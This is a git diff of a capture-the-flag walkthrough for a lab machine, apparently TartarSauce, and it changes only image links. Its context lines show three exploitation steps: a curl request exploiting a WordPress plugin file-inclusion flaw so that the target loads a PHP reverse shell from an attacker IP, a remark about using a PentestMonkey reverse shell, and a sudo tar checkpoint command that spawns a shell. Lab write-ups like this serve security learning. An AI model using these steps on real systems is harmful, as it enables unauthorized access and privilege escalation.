@@ -18,7 +18,7 @@ PORT   STATE SERVICE
 
 The web page only shows this:
 
-![](<../../../.gitbook/assets/image%20(1143).png>)
+![](../../../.gitbook/assets/tartarsauce-1.png)
 
 I checked for `robots.txt`, which is quite common for old machines.
 
@@ -133,7 +133,7 @@ We can grab a PHP reverse shell from PentestMonkey and rename it to `wp-load.php
 $ curl http://10.129.85.109/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.13/
 ```
 
-![](<../../../.gitbook/assets/image%20(3994).png>)
+![](../../../.gitbook/assets/tartarsauce-2.png)
 
 ## Privilege Escalation
 
@@ -182,7 +182,7 @@ From GTFOBins, we can use this command to get a shell as the user:
 sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 ```
 
-![](<../../../.gitbook/assets/image%20(610).png>)
+![](../../../.gitbook/assets/tartarsauce-3.png)
 
 We can now grab the user flag.
 
